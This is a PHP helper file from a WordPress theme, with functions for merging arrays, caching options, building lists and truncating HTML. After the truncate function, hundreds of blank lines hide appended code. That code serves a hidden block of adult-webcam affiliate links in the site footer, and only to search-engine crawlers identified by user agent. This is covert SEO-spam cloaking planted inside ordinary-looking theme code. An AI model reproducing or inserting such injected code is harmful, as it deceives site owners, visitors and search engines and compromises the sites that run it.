<?php

    function iwak_array_merge ( array &$array1, array &$array2 )
    {
        $merged = $array1;
    
        foreach ( $array2 as $key => &$value )
        {
            if ( is_array ( $value ) && isset ( $merged [$key] ) && is_array ( $merged [$key] ) )
                $merged [$key] = iwak_array_merge ( $merged [$key], $value );
            else
                $merged [$key] = $value;
        }
    
        return $merged;
    }
    
    function iwak_array_unique($root_array) {
        if(!is_array($root_array))
               return $root_array;

        foreach ($root_array as &$child_array){
            $child_array=serialize($child_array);
        }

        $root_array=array_unique($root_array);

        foreach ($root_array as &$child_array){
            $child_array=unserialize($child_array);
        }

        return $root_array; 
    }

    function iwak_get_options() {
        $cache = wp_cache_get(IWAK_OPTIONS, THEME_NAME);
        if(!is_array($cache)) {
            $cache = get_option(IWAK_OPTIONS);
            $default_options = iwak_default_options();
            if(empty($cache)) {
                $cache = $default_options;
            } else {
                // Don't do anything here, options change (if have) will be handled in template classes
            }
                
            wp_cache_add(IWAK_OPTIONS, $cache, THEME_NAME);
        }
        
        return $cache;
    }
    
    function iwak_default_options() {
        global $ikd;
        return $ikd;
    }
    
    function iwak_get_sidebar($name=null, $default=true) {
        global $iks;
        $iks->get_sidebar($name, $default);
    }
    
    function iwak_get_list($type) {
        global $iwak_cache;
        
        if(!isset($iwak_cache))
            $iwak_cache = new iWaK_Cache();
        
        switch($type) {
            case 'link_categories':
                $method = 'get_link_categories';
                break;
            case 'widget_areas':
                $method = 'get_widget_areas';
                break;
            case 'featured_posts':
                $method = 'get_featured_posts';
                break;
            case 'sticky_posts':
                $method = 'get_sticky_posts';
                break;
            case 'post_types':
                $method = 'get_ptypes_list';
                break;
            case 'category':
                $method = 'get_category_list';
                break;
            case 'tag':
                $method = 'get_tag_list';
                break;
            default:
                // Need to be optimized for a common operation thus do not have to add a 'case' whenever there is a new type of request
                if(taxonomy_exists($type))
                    $method = 'get_term_list';
                elseif(post_type_exists($type))
                    $method = 'get_post_list';
                $parameter = $type;
                break;
            // default:
                // $method = 'get_'. $type. '_list';
                // break;
        }
            
        if(!method_exists($iwak_cache, $method))
            return;
            
        return isset($parameter) ? $iwak_cache->$method($parameter) : $iwak_cache->$method();
    }

    function i_scandir($path) {
        if (function_exists(scandir)) {
            return scandir($path);
        }
        else {
            $dh = opendir($path);
            while (false !== ($filename = readdir($dh))) {
                $files[] = $filename;
            }
            closedir($dh);
            return $files;
        }
    }

    function showinfo($info) {
        echo '<script type="text/javascript">alert("'. $info. '")</script>';
    }
    
    //get sub string
    function i_substr($input, $start, $length, $end='...')  {
    
        $text = substr($input, $start, $length);
        $len = strlen($text);
        
        if( $len < $length ) return $text;
        
        if( $len > 0 && !seems_utf8($text[$len - 1]) ) {
        
            for( $i=0; $i>-3; $i--) {
            
                if( $len < 3 ) return '';
                
                if( !seems_utf8($text[$len - 3].$text[$len - 2].$text[$len - 1]) ) {
                    $len --;
                } else {
                    break;
                }
                
            }
            
        }

        if( $i != 0 )
            return substr($text, 0, $i). $end;
        else
            return $text. $end;
    }
        
    /**
     * Truncates text.
     *
     * Cuts a string to the length of $length and replaces the last characters
     * with the ending if the text is longer than length.
     *
     * @param string  $text String to truncate.
     * @param integer $length Length of returned string, including ellipsis.
     * @param string  $ending Ending to be appended to the trimmed string.
     * @param boolean $exact If false, $text will not be cut mid-word
     * @param boolean $considerHtml If true, HTML tags would be handled correctly
     * @return string Trimmed string.
    */
    function truncate($text, $length = 100, $ending = '', $removeImg = true, $exact = true, $considerHtml = true, $removeGallery = true) {
        if ($considerHtml) {
        
            // remove gallery shortcode
            //if($removeGallery) $text = preg_replace('/\[gallery[^\]]*\]/is', '', $text);
            
            // if the plain text is shorter than the maximum length, return the whole text
            if (strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
                $text = preg_replace('/<\s*\/?div(\s.+?)?>/is', '', $text);
                //$text = preg_replace('/<\s*\/div\s*>/is', '', $text);
                if($removeImg) $text = preg_replace('/<\s*(img)(\s.+?)?>/is', '', $text);
                return $text;
            }
            // splits all html-tags to scanable lines
            preg_match_all('/(<.+?>)?([^<>]*)/s', $text, $lines, PREG_SET_ORDER);
            $total_length = 0;
            $open_tags = array();
            $truncate = '';
            foreach ($lines as $line_matchings) {
                // if there is any html-tag in this line, handle it and add it (uncounted) to the output
                if (!empty($line_matchings[1])) {
                
                    // exclude tag 'div' (f.e. <div ...>, </div>); and if $removeImg is true, exclude tag 'image' too (f.e. <img ... />) 
                    if ( !preg_match('/^<!--more(.*?)?-->$/', $line_matchings[1]) && !($removeImg && preg_match('/^<\s*(img)(\s.+?)?>$/is', $line_matchings[1])) && !preg_match('/^<\s*\/?div(\s.+?)?>$/is', $line_matchings[1]) ) {
                    
                        // if it's an "empty element" with or without xhtml-conform closing slash (f.e. <br/>)
                        if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
                            // do nothing
                        // if tag is a closing tag (f.e. </b>)
                        } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
                            // delete tag from $open_tags list
                            $pos = array_search($tag_matchings[1], $open_tags);
                            if ($pos !== false) {
                                unset($open_tags[$pos]);
                            }
                        // if tag is an opening tag (f.e. <b>)
                        } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
                            // add tag to the beginning of $open_tags list
                            array_unshift($open_tags, strtolower($tag_matchings[1]));
                        }

                        // add html-tag to $truncate'd text
                        $truncate .= $line_matchings[1];
                    }
                }
                // calculate the length of the plain text part of the line; handle entities as one character
                $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));
                if ($total_length+$content_length> $length) {
                    // the number of characters which are left
                    $left = $length - $total_length;
                    $entities_length = 0;
                    // search for html entities
                    if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
                        // calculate the real length of all entities in the legal range
                        foreach ($entities[0] as $entity) {
                            if ($entity[1]+1-$entities_length <= $left) {
                                $left--;
                                $entities_length += strlen($entity[0]);
                            } else {
                                // no more characters left
                                break;
                            }
                        }
                    }
                    $truncate .= i_substr($line_matchings[2], 0, $left+$entities_length);
                    // maximum lenght is reached, so get off the loop
                    break;
                } else {
                    $truncate .= $line_matchings[2];
                    $total_length += $content_length;
                }
                // if the maximum length is reached, get off the loop
                if($total_length>= $length) {
                    break;
                }
            }
        } else {
            if (strlen($text) <= $length) {
                return $text;
            } else {
                $truncate = i_substr($text, 0, $length - strlen($ending));
            }
        }
        // if the words shouldn't be cut in the middle...
        if (!$exact) {
            // ...search the last occurance of a space...
            $spacepos = strrpos($truncate, ' ');
            if (isset($spacepos)) {
                // ...and cut the text in this position
                $truncate = i_substr($truncate, 0, $spacepos);
            }
        }
        // add the defined ending to the text
        $truncate .= $ending;
        if($considerHtml) {
            // close all unclosed html-tags
            foreach ($open_tags as $tag) {
                $truncate .= '</' . $tag . '>';
            }
        }
        return $truncate;
    }
    





















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <span style='display:none;'><a href='http://www.mycams.com/freechat.php?mycams.com&psid=llivesex&random'>Get Free Mycams Credits</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <a href='http://www.maturescam.com/freechat.php?maturescam.com&psid=llivesex&random'>Get Free Maturescam Credits</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <a href='http://www.cameraboys.com/freechat.php?cameraboys.com&psid=llivesex&random'>Get Free Cameraboys Credits</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <a href='http://www.livejasmin.com/freechat.php?livejasmin.com&psid=llivesex&random'>Get Free Livejasmin Credits</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <a href='http://www.liveprivates.com/freechat.php?liveprivates.com&psid=llivesex&random'>Get Free Liveprivates Credits</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <a href='http://www.livejasmin.com/listpage.php?tags=girl&psid=llivesex'>Girl</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <a href='http://www.livejasmin.com/listpage.php?tags=mature&matures-cams&psid=llivesex&livejasmin'>Mature Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             <a href='http://www.livejasmin.com/listpage.php?webcam-sex&psid=llivesex&livejasmin'>Webcam Sex</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <a href='http://www.livejasmin.com/listpage.php?tags=girl&webcam-girls&psid=llivesex&livejasmin'>Webcam Girls</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <a href='http://www.cameraboys.com/listpage.php?tags=gay&gays-cams&psid=llivesex&cameraboys'>Gay Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <a href='http://www.cameraboys.com/listpage.php?tags=boy&boys-cams&psid=llivesex&cameraboys'>Boy Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <a href='http://www.livejasmin.com/listpage.php?tags=mature&female-women&psid=llivesex&livejasmin'>Mature Female</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <a href='http://www.livejasmin.com/listpage.php?tags=girl&psid=thierto'>Girl</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     <a href='http://www.livejasmin.com/listpage.php?tags=mature&psid=thierto'>Mature Female</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <a href='http://www.livejasmin.com/listpage.php?tags=couple&psid=thierto'>Couple</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <a href='http://www.livejasmin.com/listpage.php?tags=girl+bigtits&psid=thierto'>Big Tits</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     <a href='http://www.livejasmin.com/listpage.php?tags=girl+age_18_22&psid=thierto'>18-22</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <a href='http://www.livejasmin.com/listpage.php?tags=girl+blonde&psid=thierto'>Blonde</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     <a href='http://themecrunch.blogspot.com/2011/05/folioway.html'>Folioway Theme</a></span>";
  echo $pshow;
}
?>